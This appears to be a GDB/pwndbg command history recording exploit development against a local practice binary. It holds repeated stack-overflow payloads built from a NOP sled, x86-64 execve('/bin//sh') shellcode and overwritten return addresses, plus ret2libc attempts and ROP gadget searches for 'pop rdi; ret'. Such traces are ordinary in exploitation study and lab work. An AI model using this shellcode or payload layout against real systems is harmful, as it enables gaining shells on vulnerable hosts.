r `py2 -c "print('\x90'*90+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'a'*5+'\x60\xe3\xff\xff\xff\x7f\x00\x00')"`
ni
ni
r `py2 -c "print('\x90'*90+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'a'*5+'\x60\xe3\xff\xff\xff\x7f\x00\x00')"`
ni
r `py2 -c "print('\x90'*90+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'a'*5+'\x60\xe3\xff\xff\xff\x7f\x00\x00')"`
q
b main
r  `py2 -c "print('\x90'*136)"`
set context-output /dev/pts/2
ni
nextr
q
set context-output /dev/pts/2
b main
r  `py2 -c "print('\x90'*136)"`
nextr
r  `py2 -c "print('\x90'*135)"`
ni
r  `py2 -c "print('\x90'*135)"`
q
set context-output /dev/pts/2
r  `py2 -c "print('\x90'*135)"`
r  `py2 -c "print('\x90'*105)"`
r  `py2 -c "print('\x90'*5)"`
r  `python2 -c "print('\x90'*135)"`
r  `python2 -c "print('\x90'*136)"`
b main
r  `python2 -c "print('\x90'*136)"`
ni
r   `py2 -c "print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*109)"`
r `python2 -c "print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*109)"`
ni
nextc
nextr
r `python2 -c "print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*109)"`
nextc
r `python2 -c "print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*109+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
nextr
x/20x 0x7fffffffe7d3
r `python2 -c "print('\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\x90'*109+'\xf3\xe7\xff\xff\xff\x7f\x00\x00')"`
nextr
ni
c
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
nextr
i b
b
i b
d bre 1
ni
ni 80
ni 10
ni 10
ni
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
vmmap
p code
ni
ni 90
ni
pdisas 
pdisas 10
pdisas 20
pdisas 20
x/20i 0x7fffffffe838
ni
b *0x00007fffffffe838
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
c
ni
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
c
x/10i 0x555555755010
x/10i 0x555555755010
x/10x 0x555555755010
x/10x 0x555555755010
x/8x 0x555555755010
x/8x 0x555555755010
x/8x 0x7fffffffe838
ni
x/8x 0x7fffffffe838
ni
x/8x 0x7fffffffe838
ni
x/8x 0x7fffffffe838
ni
x/8x 0x7fffffffe838
ni
x/8x 0x7fffffffe838
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
c
x/8x 0x7fffffffe838
x/8x 0x555555755010
x/8x 0x555555755010
x/8x 0x7fffffffe838
set 0x7fffffffe848 = 0x00050f3b
set * 0x7fffffffe848 = 0x00050f3b
x/8x 0x7fffffffe838
x/8x 0x555555755010
set * 0x7fffffffe850 = 0x00050f3b
x/8x 0x555555755010
x/8x 0x7fffffffe838
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
x/8x 0x555555755010
x/8x 0x555555755010
x/8x 0x7fffffffe838
set * 0x7fffffffe850 = 0x00050f3b
x/8x 0x7fffffffe838
c
ni
x/16x 0x555555755010
x/16x 0x7fffffffe838
x/16x 0x7fffffffe838
x/16x 0x555555755010
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
c
x/16x 0x555555755010
x/16x 0x555555755010
x/16x 0x555555755010
x/16x 0x7fffffffe838
set * 0x7fffffffe850 = 0x00050f3b
x/16x 0x7fffffffe838
set * 0x7fffffffe854 = 0x00000000
x/16x 0x7fffffffe838
ni
bt
ni
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
x/16x 0x555555755010
x/16x 0x7fffffffe838
set * 0x7fffffffe850 = 0x00050f3b
x/16x 0x7fffffffe838
set * 0x7fffffffe854 = 0x00000000
x/16x 0x7fffffffe838
set * 0x7fffffffe858 = 0x00000000
x/16x 0x7fffffffe838
c
ni
r `python2 -c "print('\x90'*109+'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'+'\xd3\xe7\xff\xff\xff\x7f\x00\x00')"`
c
ni
ni
q
b main
r
ni
q
b main
r
ni
ni
r
ni
r
ni
x/s 0x5555555547b8
x/3s 0x5555555547b8
x/4s 0x5555555547b8
q
p TEST
r
b main
r
q
p TEST
b main
r
p TEST
p HOME
p $HOME
p $TEST
x $TEST
x $HOME
x/x $HOME
x/s $HOME
show environment 
show environment TEST
show environment TEST
q
b main
r
r `py2 -c "print 'a'*9+'\x40\x34\xa3\xf7\xff\x7f'"`
ni

r `py2 -c "print 'a'*100"`
c
r `python2 -c "print 'a'*100"`
c
q
r `python2 -c "print 'a'*100"`
r `python2 -c "print 'a'*9"`
b main
r
r 123
nextr
b
r `python2 -c "print 'a'*9"`
i b
d bre 1
c
r `python2 -c "print 'a'*8"`
r `python2 -c "print 'a'*9"`
c
r
c
r `python2 -c "print 'a'*9+''\x40\x34\xa3\xf7\xff\x7f'"`
r `python2 -c "print 'a'*9+'\x40\x34\xa3\xf7\xff\x7f'"`
ni
ni
c
find "/bin/sh"
pwndbg
search
search "/bin/sh"
x/s 0x7ffff7b97e9a
rop
r2
cxt
context
r2
search "/bin/sh"
rop "pop rip; ret"
rop "pop rdi; ret"
rop "pop rdi"
rop "pop rdi"
rop "pop rdi; ret"
rop "pop rdi"
pwndbg
ropper
ropper
rop
rop edi
ropgadeget
ropgadget 
ropgadget edi
ropgadget edi
pwndbg
envp
search '/bin/sh'
rop
rop "pop edi"
rop main
rop --binary main
rop 
rop main
rop --ropchain --binary main
rop -h
rop --grep 'pop rdi' -- --nojop
rop --grep 'pop rdi' --
rop --grep 'pop rdi' -- --nojop
rop --grep 'pop rdi; ret'
rop --grep 'pop rdi; ret' --
rop --grep 'pop rdi ; ret' --
rop --grep 'pop rdi ; ret'
rop --grep 'pop rdi ; ret' -- --nojop
